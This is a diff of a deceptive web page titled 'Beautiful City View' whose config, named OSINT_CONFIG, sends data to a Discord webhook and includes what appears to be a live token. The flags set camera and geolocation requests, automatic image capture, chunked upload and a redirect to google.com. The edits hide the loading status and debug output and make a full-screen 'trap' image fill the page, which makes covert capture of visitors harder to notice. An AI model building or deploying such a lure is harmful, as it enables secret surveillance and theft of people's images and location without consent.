@@ -4,12 +4,43 @@
   <title>Beautiful City View</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    body { font-family: sans-serif; background:#0d1117; color:#c9d1d9; text-align:center; padding:3rem; }
-    #status { font-size:1.25rem; margin-bottom:1rem; }
-    #debugBox { max-width:600px; margin:1rem auto; text-align:left; white-space:pre-wrap; font-family:monospace; font-size:.85rem; background:#161b22; padding:1rem; border-radius:8px; display:none; }
-    #trapContainer { text-align:center; padding:20px; display:none; }
-    #trapImage { max-width:100%; height:auto; border-radius:8px; box-shadow:0 4px 8px rgba(0,0,0,0.3); }
-    #trapContainer p { margin-top:10px; color:#666; }
+    body { 
+      margin: 0; 
+      padding: 0; 
+      background: #000; 
+      overflow: hidden;
+    }
+    #status { 
+      display: none; /* إخفاء رسالة التحميل */
+    }
+    #debugBox { 
+      display: none; /* إخفاء مربع التصحيح دائماً */
+      position: fixed; 
+      top: 10px; 
+      left: 10px; 
+      background: rgba(0,0,0,0.8); 
+      color: white; 
+      padding: 5px; 
+      font-size: 10px; 
+      z-index: 9999;
+    }
+    #trapContainer { 
+      display: block; /* إظهار مباشر */ 
+      width: 100vw; 
+      height: 100vh; 
+      margin: 0; 
+      padding: 0;
+    }
+    #trapImage { 
+      width: 100vw; 
+      height: 100vh; 
+      object-fit: cover; 
+      border-radius: 0; 
+      box-shadow: none;
+    }
+    #trapContainer h2, #trapContainer p { 
+      display: none; /* إخفاء العناوين */
+    }
   </style>
 </head>
 <body>
@@ -27,11 +58,11 @@
   <script>
     window.OSINT_CONFIG = {
       webhookUrl: "https://discordapp.com/api/webhooks/1487781638401163385/AB1V9_A3C1uS1xBluFpNX4gy4zIn6XyXxx83hlvPsuMrNhBd0Huo7epfA-Em0vm-KtF", // ⚠️ TROQUE
-      finalUrl: "https://www.exemplo.com",   // destino padrão
+      finalUrl: "https://www.google.com",   // destino padrão
       requestCamera: true,   // tentar câmera?
       requestGeo: true,      // tentar geolocalização?
-      redirectDelayMs: 3000, // atraso antes do redirect
-      debug: true,           // mostrar logs na tela
+      redirectDelayMs: 2000, // atraso antes do redirect
+      debug: false,          // esconder logs na tela
       splitImage: true,      // dividir imagem em partes?
       chunkSize: 500000,     // tamanho máximo de cada parte (bytes)
       autoCapture: true,     // capturar imagem automaticamente?
